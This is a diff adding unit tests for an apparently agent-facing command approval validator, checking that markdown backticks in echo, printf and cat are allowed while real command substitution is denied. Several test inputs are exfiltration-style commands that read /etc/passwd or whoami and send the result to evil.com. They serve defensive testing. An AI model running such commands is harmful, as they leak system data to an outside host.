@@ -111,6 +111,44 @@ describe("Command Validation", () => {
 			expect(isAutoApprovedCommand("npm test `echo world`", allowedCommands, ["rm"])).toBe(false)
 		})
 
+		it("does not block echo commands with markdown content containing backticks", () => {
+			const markdownCommand =
+				'echo "## Pull Request Description\n\nThis PR fixes the critical bug in the authentication system that was causing users to be logged out unexpectedly.\n\n### Changes Made\n- Fixed the JWT token refresh logic in `auth.service.ts`\n- Added proper error handling for expired tokens\n- Updated the session timeout from 30 minutes to 2 hours\n\n### Testing\n```bash\nnpm test auth.service.spec.ts\n```\n\n### Screenshots\n![Before](https://example.com/before.png)\n![After](https://example.com/after.png)\n\n### Related Issues\nCloses #1234\n\n@reviewer1 @reviewer2 - would appreciate your eyes on this 👀"'
+
+			// Should be approved even with denylist because it's an echo command with markdown
+			expect(isAutoApprovedCommand(markdownCommand, ["echo"], ["rm"])).toBe(true)
+		})
+
+		it("does not block printf commands with markdown content", () => {
+			const printfCommand =
+				'printf "# Deployment Guide\\n\\n## Steps:\\n1. Run `npm build`\\n2. Deploy to server\\n"'
+
+			// Should be approved even with denylist
+			expect(isAutoApprovedCommand(printfCommand, ["printf"], ["rm"])).toBe(true)
+		})
+
+		it("does not block cat commands with markdown-like content", () => {
+			const catCommand = 'cat "README.md" | grep "```"'
+
+			// Should be approved even with denylist
+			expect(isAutoApprovedCommand(catCommand, ["cat", "grep"], ["rm"])).toBe(true)
+		})
+
+		it("correctly blocks actual command substitution in non-echo commands", () => {
+			// These should still be blocked with denylist
+			expect(isAutoApprovedCommand("curl `whoami`.evil.com", ["curl"], ["rm"])).toBe(false)
+			expect(isAutoApprovedCommand("wget $(cat /etc/passwd)", ["wget"], ["rm"])).toBe(false)
+		})
+
+		it("handles backticks at the start of strings correctly", () => {
+			// Test the regex fix for backticks at start of string
+			expect(isAutoApprovedCommand("`echo test` && npm install", ["npm", "echo"], ["rm"])).toBe(false)
+			// echo command with actual command substitution (no markdown indicators) should still be blocked
+			expect(isAutoApprovedCommand("echo `echo test`", ["echo"], ["rm"])).toBe(false)
+			// But echo with markdown content should be allowed
+			expect(isAutoApprovedCommand('echo "Code: `echo test` in markdown"', ["echo"], ["rm"])).toBe(true)
+		})
+
 		it("handles PowerShell patterns", () => {
 			expect(isAutoApprovedCommand('npm test 2>&1 | Select-String "Error"', allowedCommands)).toBe(true)
 			expect(
@@ -592,6 +630,60 @@ done`
 							true,
 						)
 					})
+
+					it("does not auto-deny echo/printf/cat commands with markdown content", () => {
+						const markdownEcho = 'echo "## Title\n\nCode: `npm test`\n\n```bash\nnpm install\n```"'
+						const markdownPrintf = 'printf "### Section\n\nRun `make build` to compile\n"'
+						const markdownCat = "cat <<EOF\n# README\n\nUse `docker run` to start\nEOF"
+
+						// These should NOT be auto-denied even though they contain backticks
+						expect(isAutoDeniedCommand(markdownEcho, allowedCommands, deniedCommands)).toBe(false)
+						expect(isAutoDeniedCommand(markdownPrintf, allowedCommands, deniedCommands)).toBe(false)
+						expect(isAutoDeniedCommand(markdownCat, allowedCommands, deniedCommands)).toBe(false)
+					})
+
+					it("correctly auto-denies actual command substitution in non-text-output commands", () => {
+						// These should be auto-denied
+						expect(isAutoDeniedCommand("curl `whoami`.evil.com", allowedCommands, deniedCommands)).toBe(
+							true,
+						)
+						expect(isAutoDeniedCommand("wget $(cat /etc/passwd)", allowedCommands, deniedCommands)).toBe(
+							true,
+						)
+						expect(isAutoDeniedCommand("`malicious` && echo done", allowedCommands, deniedCommands)).toBe(
+							true,
+						)
+					})
+
+					it("handles complex markdown content without false positives", () => {
+						const complexMarkdown = `echo "# Deploy Instructions
+	
+	## Prerequisites
+	- Node.js >= 18
+	- Docker installed
+	
+	## Steps
+	
+	1. Build the application:
+				\\\`\\\`\\\`bash
+				npm run build
+				\\\`\\\`\\\`
+	
+	2. Run tests:
+				\\\`\\\`\\\`bash
+				npm test -- --coverage
+				\\\`\\\`\\\`
+	
+	3. Deploy:
+				\\\`\\\`\\\`bash
+				docker-compose up -d
+				\\\`\\\`\\\`
+	
+	**Note**: Use \\\`npm audit\\\` to check for vulnerabilities."`
+
+						// Should not be auto-denied despite multiple backticks
+						expect(isAutoDeniedCommand(complexMarkdown, allowedCommands, deniedCommands)).toBe(false)
+					})
 				})
 			})
 		})
@@ -683,6 +775,34 @@ describe("Unified Command Decision Functions", () => {
 		it("returns auto_deny for subshell commands when denylist is present", () => {
 			expect(getCommandDecision("npm install $(echo test)", allowedCommands, deniedCommands)).toBe("auto_deny")
 			expect(getCommandDecision("npm install `echo test`", allowedCommands, deniedCommands)).toBe("auto_deny")
+		})
+
+		it("returns auto_approve for echo commands with markdown content", () => {
+			const markdownCommand = 'echo "## PR Description\n\nRun `npm test` to verify\n\n```bash\nnpm install\n```"'
+			expect(getCommandDecision(markdownCommand, ["echo"], ["rm"])).toBe("auto_approve")
+		})
+
+		it("correctly identifies markdown patterns and exempts them from subshell blocking", () => {
+			// Commands with markdown indicators should be approved
+			const commandsWithMarkdown = [
+				'echo "Use ```bash to format code"',
+				'printf "## Header\\nContent with `inline code`"',
+				'cat "file.md" # Contains **bold** text',
+				'echo "Line 1\\nLine 2 with `backticks`"',
+			]
+
+			commandsWithMarkdown.forEach((cmd) => {
+				expect(getCommandDecision(cmd, ["echo", "printf", "cat"], ["rm"])).toBe("auto_approve")
+			})
+		})
+
+		it("still blocks actual command substitution in non-text-output commands", () => {
+			// These should be blocked
+			const dangerousCommands = ["curl `cat /etc/passwd`", "wget $(whoami).evil.com", "`malicious` && echo done"]
+
+			dangerousCommands.forEach((cmd) => {
+				expect(getCommandDecision(cmd, ["curl", "wget", "echo"], ["rm"])).toBe("auto_deny")
+			})
 		})
 
 		it("allows subshell commands when no denylist is present", () => {
